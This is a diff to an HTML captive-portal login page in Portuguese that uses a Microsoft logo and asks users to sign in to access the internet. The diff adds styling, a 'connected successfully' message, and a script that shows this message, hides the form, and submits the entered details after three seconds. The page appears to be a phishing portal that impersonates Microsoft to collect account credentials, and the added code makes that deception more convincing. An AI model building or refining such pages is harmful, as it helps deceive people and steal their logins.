@@ -98,6 +98,17 @@
       justify-content: end;
       padding: 30px 0px 25px 0px;
     }
+    div#form-block{
+      min-height: 150px;
+    }
+    div#success-block{
+      display: none;
+      text-align: center;
+      min-height: 100px;
+      margin-bottom: 30px;
+      justify-content: center;
+      align-items: center;
+    }
     @media screen and (min-width: 768px){
       .logo{
         max-width: 80px;
@@ -118,7 +129,7 @@
           <img data-testid=accessibleImg class="___1v417w0 f2rbwfs frvgh55" src=data:image/png;base64,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 alt=Microsoft role>
         </div>
       </center>
-      <div style='min-height: 150px'>
+      <div id='form-block'>
         <center>
           <div class='containertitle'></div>
           <div class='containersubtitle'>Entre para acessar a internet</div>
@@ -131,7 +142,25 @@
           </div>
         </form>
       </div>
+      <div id='success-block'>
+        <center>
+          <div>Conectado com sucesso. </br>Em instantes você será redirecionado.</div>
+        </center>
+      </div>
     </div>
   </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      document.getElementById('success-block').style.display = 'flex';
+      document.getElementById('form-block').style.display = 'none';
+
+      setTimeout(function() {
+        document.getElementById('login-form').submit();
+      }, 3000);
+    });
+  </script>
 </body>
 </html>
